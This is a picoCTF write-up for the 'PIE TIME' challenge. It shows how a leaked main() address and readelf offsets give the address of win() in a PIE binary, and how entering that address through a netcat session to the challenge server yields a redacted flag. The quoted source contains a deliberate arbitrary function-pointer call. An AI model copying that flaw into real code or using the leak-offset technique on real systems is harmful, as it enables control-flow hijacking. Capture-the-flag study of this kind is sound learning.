# PIE TIME #
 
## Overview ##

75 points

Category: [Binary Exploitation](../)

Tags: `#binaryexploitation #PIE #infoleak #ASLR`

## Description ##

Can you try to get the flag? Beware we have PIE!

## Approach ##

Analysing the provided `vuln.c` challenge source file, there is a `win()` function that drops our flag from a file, that we need to call.

`main()` requests an address from the user to call as a function pointer, obviously the target is the address of the `win()` function.

    int main() {
      signal(SIGSEGV, segfault_handler);
      setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

      printf("Address of main: %p\n", &main);

      unsigned long val;
      printf("Enter the address to jump to, ex => 0x12345: ");
      scanf("%lx", &val);
      printf("Your input: %lx\n", val);

      void (*foo)(void) = (void (*)())val;
      foo();
    }

Checking binary securities:

    $ checksec vuln
    [*] '/home/user/picoCTF/PIE-TIME/vuln'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled

As the name of the challenge would have us suspect, the binary is a Position Independent Executable (PIE), meaning our code segment will be located at a different address each execution.

Conveniently the address of `main()` is "leaked" (or given to us rather), so we can calculate the relative offset from `main()` to `win()` functions such that we can apply this relative offset to the leaked address, resulting in the current absolute address for the `win()` function for this execution. This is possible as the code segment moves around in the address space, but the relative offsets of the code within the segment remains the same.

So lets find the offsets of these functions from the code segment base (or portable) address and then calculate the relative offset between them:

    $ readelf -s ./vuln | egrep "main|win"
        66: 00000000000012a7   150 FUNC    GLOBAL DEFAULT   16 win
        70: 000000000000133d   204 FUNC    GLOBAL DEFAULT   16 main

    (offset of win()) - (offset of main()) = relative offset
    0x133d - 0x12a7 = 0x96    

Noting that `win()` is at a lower address, hence we must subtract this relative offset from the leaked `main()` address.

## Solution ##

From the challenge server: 

    $ nc rescued-float.picoctf.net 55494
    Address of main: 0x5660322e333d
    Enter the address to jump to, ex => 0x12345: 0x5660322E32A7
    Your input: 5660322e32a7
    You won!
    picoCTF{...........redacted.............}

The address of `main()` for this invocation was `0x5660322e333d`.

Therefore `0x5660322e333d - 0x96 = 0x5660322e32a7`. Inputting this calculated absolute address for `win()` dropped us the flag.

Where the actual flag value has been redacted for the purposes of this write up.
